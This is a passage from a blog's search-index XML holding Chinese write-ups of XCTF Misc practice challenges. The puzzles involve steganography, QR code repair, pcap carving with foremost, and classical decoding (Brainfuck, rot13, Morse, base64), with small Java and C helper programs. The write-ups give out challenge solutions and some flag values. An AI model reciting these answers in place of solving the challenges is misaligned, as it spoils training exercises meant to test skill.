alt="在这里插入图片描述"><br>（4）hint为“试着找出像素的秘密”，用stegsolve工具合成这两张图片，发现一些红点，貌似是二维码<br><img src="https://img-blog.csdnimg.cn/20201029235544453.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（5）用wps图片编辑，在“工具”中选择“色彩”，将亮度和饱和度调到最高<br><img src="https://img-blog.csdnimg.cn/2020102923562537.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（6）发现还是不太明显，先保存这张图片，再用wps图片工具打开，再调一遍亮度和饱和度<br><img src="https://img-blog.csdnimg.cn/20201029235702553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（7）可以看到清晰的二维码图片，用二维码扫描工具扫描图片，发现flag<br><img src="https://img-blog.csdnimg.cn/2020102923573284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="Training-Stegano-1"><a href="#Training-Stegano-1" class="headerlink" title="Training-Stegano-1"></a>Training-Stegano-1</h2><p>一张bmp格式的图片，直接用notepad++打开，即可看flag，注意提交时不用加flag{}<br><img src="https://img-blog.csdnimg.cn/20201029235912499.png#pic_center" alt="在这里插入图片描述"></p><h2 id="can-has-stdio"><a href="#can-has-stdio" class="headerlink" title="can_has_stdio?"></a>can_has_stdio?</h2><p>（1）用notepad++打开附件<br><img src="https://img-blog.csdnimg.cn/20201029235946797.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）发现是Brainfuck文件，用在线解析工具得到flag<a href="http://ctf.ssleye.com/brain.html">http://ctf.ssleye.com/brain.html</a><br><img src="https://img-blog.csdnimg.cn/20201030000056979.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>#Brainfuck解析规则：<br>     “&gt;”: 指针位置右移一位<br>    “&lt;”: 指针位置左移一位<br>     +: 指针所指向的位置里面的值加1<br>     -: 指针所指向的位置里面的值减1<br>     . :输出指针当前位置指向单元格中的内容<br>     [: 如果指针指向的单元值为零，向后跳转到对应的]指令的次一指令处<br>     ]:如果指针指向的单元值不为零，向前跳转到对应的[指令的次一指令处(额…好像比较难理解,只是用于循环某一段代码而已,两个一般联合使用)</p>]]></content>
      
      
      <categories>
          
          <category> XCTF_Misc进阶区 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF_Misc练习区</title>
      <link href="2020/11/15/XCTF/XCTF_Misc%E7%BB%83%E4%B9%A0%E5%8C%BA/"/>
      <url>2020/11/15/XCTF/XCTF_Misc%E7%BB%83%E4%B9%A0%E5%8C%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="ext3"><a href="#ext3" class="headerlink" title="ext3"></a>ext3</h2><p>(1)附件是一个没有后缀的文件，使用notepad++打开，Ctrl+F出现搜索框，搜索flag<br><img src="https://img-blog.csdnimg.cn/20201029151711345.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201029151757386.png#pic_center" alt="在这里插入图片描述"><br>（2）发现在O7avZhikgKgbF目录下有个flag文件，用7-ZIP工具打开附件，找到flag.txt文件。<br><img src="https://img-blog.csdnimg.cn/20201029151943811.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020102915202880.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201029152125452.png#pic_center" alt="在这里插入图片描述"><br>（3）出现了一串base64加密的字符串，这里我用的是CaptfEncoder工具，解码后得flag{sajbcmbzskjjcnbhsbvcjbjszcszbkzj}<br><img src="https://img-blog.csdnimg.cn/20201029152641255.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="功夫再高也怕菜刀"><a href="#功夫再高也怕菜刀" class="headerlink" title="功夫再高也怕菜刀"></a>功夫再高也怕菜刀</h2><p>（1）附件是一个.pcapng文件，使用Wireshark打开文件查看报文查找flag信息，输入表达式http contains flag查看http协议的报文是否包含flag 的信息<br><img src="https://img-blog.csdnimg.cn/20201029152930291.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）根据筛选出的报文，追踪tcp流，在第1150个报文中发现一串十六进制的流信息，其中，FFD8是jpg文件头标志，FFD9是结束标志，说明这里有一张jpg格式的图片。<br><img src="https://img-blog.csdnimg.cn/202010291533526.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201029153359337.png#pic_center" alt="在这里插入图片描述"><br>（3）将这部分信息复制到一个文本文档.txt中保存，用010 editor工具以十六进制导入，并另存为jpg格式，得到一张图片<br><img src="https://img-blog.csdnimg.cn/20201029153505599.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201029153603932.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（4）接着在kali中用foremost分离附件.pcapng文件，得到一个zip文件，里面有一个压缩包，包含flag文件。使用上面图片中的“Th1s_1s_p4sswd_!!!”作为密码，获取flag。</p><p>#foremost已在kali中预安装，使用如下命令安装</p><pre><code class="javascript">$sudo apt-get install foremost       //非管理员需要加上sudo</code></pre><p>#分离文件</p><pre><code class="javascript">$foremost -t all ctf.pcapng         </code></pre><p>#执行完上面的语句后，会生成一个output目录，进入该目录即可查看分离的文件。</p><h2 id="give-you-flag"><a href="#give-you-flag" class="headerlink" title="give_you_flag"></a>give_you_flag</h2><p>（1）附件是一张gif的动图，查看后可发现图片里存在一个二维码。于是这里用stegsolve工具将动图分解为一张张图片，以便查看。<br><img src="https://img-blog.csdnimg.cn/2020102916030193.png#pic_center" alt="在这里插入图片描述"><br>（2）找到那张出现二维码的图片，发现定位点缺失。百度下载一张二维码定位点图片，接着打开Windows自带的画图工具，选择“新建”，然后依次把定位点图片和二维码图片通过“粘贴来源“导入，将定位点拖拽到缺失的地方，保存即可。（不会ps只能这样了，嘤嘤嘤~）<br>#下载的定位点图片可能会有一些白色边框，在合成图片时可能会覆盖掉二维码。同样可以在画图工具里，打开定位点图片，通过多次“旋转”的操作，然后不断调整白色画布的大小去掉边框，去掉边框后保存就可以了。<br><img src="https://img-blog.csdnimg.cn/20201029161225356.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）二维码图片补全后，用二维码扫描器扫描就可以得到flag了。<br><img src="https://img-blog.csdnimg.cn/20201029162926218.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>#stegsolve工具：<br>File Format:文件格式，这个主要是查看图片的具体信息<br>Data Extract:数据抽取，图片中隐藏数据的抽取<br>Frame Browser:帧浏览器，主要是对GIF之类的动图进行分解，动图变成一张张图片，便于查看<br>Image Combiner:拼图，图片拼接<br>#stegsolve打开方式：<br>（1）首先需要添加java环境，这里就不赘述了。<br>（2）打开stegsolve所在目录，在目录框输入cmd，打开运行窗口<br><img src="https://img-blog.csdnimg.cn/20201029163702280.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020102916372191.png#pic_center" alt="在这里插入图片描述"><br>（3）在运行窗口输入以下命令即可打开：</p><pre><code>java -jar stegsolve.jar</code></pre><p><img src="https://img-blog.csdnimg.cn/20201029163957823.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201029164057932.png#pic_center" alt="在这里插入图片描述"></p><h2 id="坚持60s"><a href="#坚持60s" class="headerlink" title="坚持60s"></a>坚持60s</h2><p>（1）附件是一个.jar文件，在cmd下用java -jar xxxx.jar查看<br><img src="https://img-blog.csdnimg.cn/20201029164458822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）用jd-gui工具反编译，在cn.bjsxt.plane.PlaneGameFrame.class文件下发现flag（Ctrl+F搜索）<br><img src="https://img-blog.csdnimg.cn/20201029165606637.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="gif"><a href="#gif" class="headerlink" title="gif"></a>gif</h2><p>（1）解压附件，在gif文件夹下看到许多黑白的图片，联想到二进制<br><img src="https://img-blog.csdnimg.cn/20201029170006125.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）将各个图片转化为对应的二进制，使用在线二进制转字符串工具<a href="http://www.txttool.com/WenBen_BinaryStr.asp">http://www.txttool.com/WenBen_BinaryStr.asp</a>即可得到flag。</p><h2 id="掀桌子"><a href="#掀桌子" class="headerlink" title="掀桌子"></a>掀桌子</h2><p><img src="https://img-blog.csdnimg.cn/20201029172950592.png#pic_center" alt="在这里插入图片描述"><br>（1）获取的报文内容为0-9，a-f，考虑十六进制。但该串十六进制数无法直接转化为字符串（ASCII值）<br>（2）把十六进制两两一组转换为十进制；接着将十进制数减去128（因为ASCII码值为0~127），让其落到ASCII码表上，然后计算出对应ASCII码值的字符，获取flag。<br>（3）采用如下java编写的代码：</p><pre><code>public class Misc &#123;    public static void main(String[] args) &#123;        // TODO Auto-generated method stub        String hex=&quot;c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2&quot;;        String temp=&quot;&quot;;        String flag=&quot;&quot;;        for(int i = 0; i &lt; hex.length();i+=2) &#123;            temp=hex.substring(i,i+2);   //获取相邻的字符            long dec=Long.parseLong(temp,16);    //将两个字符转换为十进制            flag=Long.toString(dec-128);         //将Long型的十进制值减去128，再转换为String            System.out.print((char)Integer.parseInt(flag));   //解析flag为十进制整数，并强制转换为char，存取字符        &#125;    &#125;&#125;</code></pre><p>（4）查看执行结果<br><img src="https://img-blog.csdnimg.cn/20201029173408937.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="如来十三掌"><a href="#如来十三掌" class="headerlink" title="如来十三掌"></a>如来十三掌</h2><p>（1）附件是一串禅语<br><img src="https://img-blog.csdnimg.cn/2020102917361431.png#pic_center" alt="在这里插入图片描述"><br>（2）使用在线工具使用“与佛论禅”来进行解码（解码时记得在原文字的开头加上“佛曰：”）在线工具：<a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx">http://www.keyfc.net/bbs/tools/tudoucode.aspx</a><br><img src="https://img-blog.csdnimg.cn/20201029173842414.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）根据题目提示的13掌，用rot-13解码</p><p>#rot13使用一个简单的替换加密算法，类似凯撒密码<br><img src="https://img-blog.csdnimg.cn/20201029174109664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（4）又是一串密文，用base64试试，看到flag。<br><img src="https://img-blog.csdnimg.cn/20201029174247479.png#pic_center" alt="在这里插入图片描述"></p><h2 id="stegano"><a href="#stegano" class="headerlink" title="stegano"></a>stegano</h2><p>（1）附件是一个pdf文件，全选后复制到一个word文档里，发现了一串特殊的字符<br><img src="https://img-blog.csdnimg.cn/20201029174606857.png#pic_center" alt="在这里插入图片描述"><br>（2）看到AB，但不是培根密码，培根密码是5个一组，联想到摩斯密码将A替换为. ，B替换为-，可以自己写个代码转换一下（这里我用的c语言）</p><pre><code>int main()&#123;    char word[200];    gets(word);    int i=0;    while(word[i] != 0)&#123;        if(word[i] == &#39;A&#39;)&#123;            word[i]=&#39;.&#39;;            printf(&quot;%c&quot;,word[i]);        &#125;        if(word[i]  == &#39; &#39;)&#123;            printf(&quot; &quot;);        &#125;        if(word[i] == &#39;B&#39;)&#123;            word[i]=&#39;-&#39;;            printf(&quot;%c&quot;,word[i]);        &#125;//        printf(&quot;%s&quot;,word[i]);        i++;    &#125;    system(&quot;pause&quot;);    return 0;</code></pre><p>（3）然后放到在线摩斯密码加解密上解密<a href="http://www.txttool.com/t/?id=Mzg1">http://www.txttool.com/t/?id=Mzg1</a>（注意分割的时候空格也要输入）<br><img src="https://img-blog.csdnimg.cn/20201029175536902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="SimpleRAR"><a href="#SimpleRAR" class="headerlink" title="SimpleRAR"></a>SimpleRAR</h2><p>（1）解压附件得到一张两帧的图片<br><img src="https://img-blog.csdnimg.cn/20201029180040104.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）现将这两帧图片分别保存，然后用stegsolve分别打开，发现是都是缺失一半的二维码图片<br><img src="https://img-blog.csdnimg.cn/20201029180455273.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020102918051475.png#pic_center" alt="在这里插入图片描述"><br>（3）利用画图工具，将两张图拼在一起，并将定位点补充完整，用二维码扫描器扫描即可<br><img src="https://img-blog.csdnimg.cn/20201029180621881.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201029180648595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> XCTF_Misc练习区 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF靶场 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
